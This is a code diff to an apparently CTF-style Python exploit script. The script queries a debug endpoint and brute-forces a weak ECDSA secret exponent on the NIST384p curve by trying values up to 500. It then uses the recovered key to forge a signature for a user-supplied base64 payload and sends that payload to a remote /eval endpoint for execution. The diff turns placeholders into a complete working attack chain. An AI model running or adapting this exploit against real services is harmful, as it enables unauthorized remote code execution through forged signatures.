@@ -36,12 +36,19 @@ def get_dbg_info():
     return r.json()
 
 
-def send_exploit(exploit, sign):
+def send_exploit(exploit, rand):
+    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
+    vk = sk.get_verifying_key()
+
+    def sign(msg):
+        return binascii.hexlify(sk.sign(msg))
+
     queryurl = BASEHOST + "/eval"
+    finalexploit = base64.b64decode(exploit.encode())
     logger.critical("Sending exploit...")
     payload = {
-        "expr": "EXPLOIT HERE",
-        "sig": "SIGNATURE HERE"
+        "expr": finalexploit.decode(),
+        "sig": sign(finalexploit).decode()
     }
     r = requests.post(queryurl, json=payload)
     try:
@@ -52,7 +59,7 @@ def send_exploit(exploit, sign):
 
 
 def printusage():
-    print("Usage: " + sys.argv[0] + " <Base64-encoded Payload> <Base64-encoded Signature>")
+    print("Usage: " + sys.argv[0] + " <Base64-encoded Payload>")
 
 
 def try_bf(orijson):
@@ -66,7 +73,8 @@ def try_bf(orijson):
     oridt = orijson['response']['Expression'].encode()
     orisig = orijson['response']['Signature'].encode()
     FLAG = 0
-    for i in range(1, 101):
+    for i in range(1, 501):
+        logger.info("Current Working on: RAND=" + str(i))
         rand = i
         sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
         vk = sk.get_verifying_key()
@@ -74,24 +82,25 @@ def try_bf(orijson):
         if success_not:
             FLAG = 1
             logger.critical("Rand is: " + str(rand))
-            break
+            return rand
     if FLAG == 0:
-        print("You may reset the machine, rand is large than 100.")
+        print("You may reset the machine, rand is large than 500.")
         sys.exit(0)
 
 
-# def main(exploit):
 def main():
     printusage()
     check_server()
     orid = get_dbg_info()
-    try_bf(orid)
-    # send_exploit(exploit)
+    rand = try_bf(orid)
+    send_exploit(sys.argv[1], rand)
 
 
 if __name__ == '__main__':
-    # if not sys.argv[1]:
-    #     logger.info("Payload Not Found.")
-    #     sys.exit(1)
-    # main(base64.b64decode(sys.argv[1].encode()))
+    try:
+        if sys.argv[1]:
+            pass
+    except IndexError:
+        print("Base64-encoded Payload Not Found.")
+        sys.exit(1)
     main()
